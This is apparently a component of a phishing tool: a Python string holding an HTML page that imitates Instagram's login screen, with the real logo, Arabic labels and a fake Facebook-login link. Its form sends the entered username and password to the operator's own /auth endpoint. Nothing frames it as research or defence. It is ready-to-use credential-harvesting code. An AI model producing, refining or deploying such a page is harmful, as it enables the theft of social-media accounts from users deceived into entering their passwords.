# --- واجهة إنستغرام الاحترافية (مع الشعار والصورة الخلفية) ---
HTML_INSTA = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px 40px; box-sizing: border-box; text-align: center; margin-top: 10px; }
        
        /* --- إضافة الشعار الرسمي --- */
        .logo { margin: 22px auto 12px; width: 175px; height: 51px; background-image: url('https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560560d9a.png'); background-size: contain; background-repeat: no-repeat; }
        
        input { width: 100%; padding: 9px 7px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; }
        button { width: 100%; background: #0095f6; border: none; color: white; padding: 5px 0; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 8px; font-size: 14px; }
        .footer { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px; text-align: center; margin-top: 10px; font-size: 14px; box-sizing: border-box; }
        .footer a { color: #0095f6; text-decoration: none; font-weight: bold; }
        
        /* --- إضافة أيقونات أخرى (مثل فيسبوك) --- */
        .fb-login { margin-top: 20px; font-size: 14px; color: #385185; font-weight: bold; cursor: pointer; }
        .fb-icon { width: 16px; height: 16px; margin-left: 8px; vertical-align: middle; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo"></div>
        
        <form method="POST" action="/auth">
            <input type="text" name="u" placeholder="اسم المستخدم أو الهاتف" required>
            <input type="password" name="p" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
        
        <div class="fb-login">
            <img src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Facebook_logo_%28square%29.png" class="fb-icon" alt="FB logo">
            تسجيل الدخول بحساب فيسبوك
        </div>
    </div>
    <div class="footer">ليس لديك حساب؟ <a href="#">تسجيل</a></div>
</body>
</html>
'''
